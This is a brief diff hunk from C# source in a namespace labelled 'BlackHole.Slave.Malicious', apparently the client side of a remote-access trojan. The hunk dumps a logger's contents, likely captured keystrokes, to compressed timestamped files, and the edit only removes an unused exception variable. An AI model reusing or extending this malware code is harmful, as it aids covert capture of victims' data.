@@ -229,7 +229,7 @@ namespace BlackHole.Slave.Malicious
                 File.WriteAllBytes(string.Format(filePath, DateTime.Now.ToString("dd_HH_mm")), Encoding.Default.GetBytes(m_logger.ToString()).CompressLz4());
                 m_logger.Clear();
             }
-            catch(Exception e)
+            catch
             {
             }
 
